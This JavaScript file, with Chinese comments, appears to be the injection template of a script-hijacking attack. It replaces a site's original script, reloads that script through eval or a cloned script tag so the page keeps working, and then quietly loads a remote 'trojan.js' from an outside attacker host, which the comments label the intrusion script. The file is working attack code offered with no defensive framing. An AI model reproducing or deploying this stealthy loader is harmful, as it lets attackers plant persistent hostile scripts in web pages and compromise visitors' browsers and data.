/**
 * 预加载脚本的内容
 *   @update: 2015/01/02
 */
(function(runInEval, rawUrl, charset) {

    var newUrl = 'http://' + rawUrl + 
                    (/\?/.test(rawUrl)? '&' : '?') + '_nocache_=1';

    var doc = document;
    var head = doc.head || doc.getElementsByTagName('head')[0];

    function getCurrentScriptNode() {
        return doc.currentScript ||
            doc.scripts[doc.scripts.length - 1];
    }

    //
    // 本文件内容被 eval 执行
    // 尝试用同步的方式，加载原始脚本再执行。
    //
    if (runInEval) {
        var xhr = new XMLHttpRequest();
        var err;
        try {
            xhr.open('GET', newUrl, false);
            xhr.send();
        }
        catch (e) {
            // 无法加载，则用使用后续方案
            err = true;
        }
        if (!err) {
            return eval(xhr.responseText);
        }
    }

    function loadScript(src) {
        var s = doc.createElement('script');
        s.src = src;
        head.appendChild(s);
        return s;
    }

    //
    // 加载原始脚本，保证页面正常运行
    // （克隆当前脚本元素，保证自定义属性不丢失）
    //
    var curSpt = getCurrentScriptNode();
    var newSpt = curSpt.cloneNode(true);
    newSpt.src = newUrl;
    if (charset) {
        newSpt.charset = charset;
    }
    curSpt.parentNode.replaceChild(newSpt, curSpt);

    // 激活入侵脚本
    function trojan() {
        if (!window._actived) {
            window._actived = true;
            loadScript('//www.etherdream.com/hack/trojan.js');
        }
    }
    trojan();
})(
    //
    // 检测当前是否在 eval 中执行
    //
    // 如果是通过 <script> 引入，那么当前位于全局域；
    // 如果加载文本后 eval 执行，当前位于回调函数里。
    // 所以检查 arguments 变量是否存在，检测是否被 eval。
    //
    typeof arguments != 'undefined',

    // 原始脚本路径
    '%URL',

    // 原始脚本编码
    '%CHAR'
);
